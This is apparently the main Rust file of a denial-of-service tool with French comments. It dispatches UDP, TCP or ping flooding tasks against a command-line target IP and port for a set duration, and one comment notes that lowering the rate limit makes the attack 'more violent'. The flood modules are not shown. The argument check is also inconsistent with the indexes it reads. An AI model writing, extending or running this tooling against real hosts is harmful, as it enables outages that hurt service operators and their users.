mod ddos_udp;
mod ddos_ping;
mod ddos_tcp;

use tokio;
use std::error::Error;
use std::env;
use tokio::sync::mpsc;
use tokio::time::{sleep, Duration};


async fn chrono(tx: mpsc::Sender<()>, ddos_time:u64) {

    sleep(Duration::from_secs(ddos_time)).await;
    println!("chrono over");

    // ESignal de fin
    let _ = tx.send(()).await;
}




#[tokio::main]
async fn main() {

    //ENV VARIBALES
    let rate_limite:u64 = 100000; // plus on baisse plus c'estt violent


    //ENV VARIBALES

    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        eprintln!("Usage: {} <ip> <port>", args[0]);
        return;
    }


    let ddos_time:u64 = args[3].parse::<u64>().unwrap();

    let (tx, mut rx) = mpsc::channel(1);

    // Création des futures pour les deux tâches asynchrones
    let chrono_task = tokio::spawn(async move {
        chrono(tx,ddos_time).await;
    });


    let mut ddos_task;

    match args[4].as_str() {
        "udp" => {
            let target = format!("{}:{}", args[1], args[2]);

            ddos_task = tokio::spawn(async move {
                ddos_udp::ddos_udp(&mut rx, target,rate_limite).await;
            });

            chrono_task.await.unwrap();
        },
        "tcp" => {
            let target_ip = args[1].clone();
            let target_port = args[2].clone();

            ddos_task = tokio::spawn(async move {
                ddos_tcp::ddos_tcp(&mut rx, target_ip,target_port,rate_limite).await;
            });

            chrono_task.await.unwrap();

        },
        "ping" => {
            let target = format!("{}", args[1]);
            println!("ping ddos");
            ddos_task = tokio::spawn(async move {
                ddos_ping::ddos_ping(&mut rx, target, rate_limite).await;
            });

            chrono_task.await.unwrap();
        },

        _ => {
            println!("veuillez donner une méthode : tcp, udp ou ping ");
            return ()
        }
    }
}


